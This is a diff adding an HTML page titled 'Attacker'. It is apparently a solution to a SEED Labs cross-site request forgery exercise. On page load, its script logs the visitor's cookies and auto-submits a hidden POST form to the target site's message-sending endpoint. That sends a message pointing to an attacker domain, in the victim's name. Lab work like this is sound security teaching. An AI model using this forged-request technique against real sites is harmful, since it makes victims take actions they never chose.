@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Attacker</title>
+</head>
+
+<body>
+	<script type="text/javascript">
+		function forgeRequest() {
+			let fields = "";
+			fields += `<input type="hidden" name="match_on" value="users">`;
+			fields += `<input type="hidden" name="recipients[]" value="57">`;
+			fields += `<input type="hidden" name="subject" value="Ha Ha Ha">`;
+			fields += `<input type="hidden" name="body" value="www.attacker32.com">`;
+
+			// Create a <form> element.
+			var p = document.createElement("form");
+
+			// Construct the form
+			p.action = "http://www.seed-server.com/action/messages/send";
+			p.innerHTML = fields;
+			p.method = "post";
+
+			// Append the form to the current page.
+			document.body.appendChild(p);
+			console.log(p)
+
+			// Submit the form
+			p.submit();
+			// on submit, log the response
+			p.onload = () => {
+				console.log(p.response)
+			}
+		}
+
+		window.onload = () => {
+			console.log(document.cookie)
+			forgeRequest();
+		}
+	</script>
+</body>
+
+</html>
